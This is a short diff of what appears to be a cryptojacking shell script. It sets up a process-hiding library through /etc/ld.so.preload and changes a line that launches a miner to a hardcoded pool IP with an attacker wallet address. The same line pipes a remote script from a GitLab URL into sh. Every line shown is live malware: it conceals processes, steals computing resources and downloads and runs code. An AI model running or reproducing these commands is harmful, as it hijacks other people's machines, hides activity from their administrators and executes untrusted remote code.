@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gm3.43 -a firo -s 167.172.24.221:80 -u aBzsYiZ1AJ7SDTyL4o4FmdNipWE5qAx3kk.$(shuf -n 1 -i 1-3000)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./gm3.43 -a octopus -s 157.230.239.11:80 -u cfx:aasxa8kh69rz97vxy8mwxp1bkdawvxxrh6cjdk3c6y.$(shuf -n 1 -i 1-3000)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
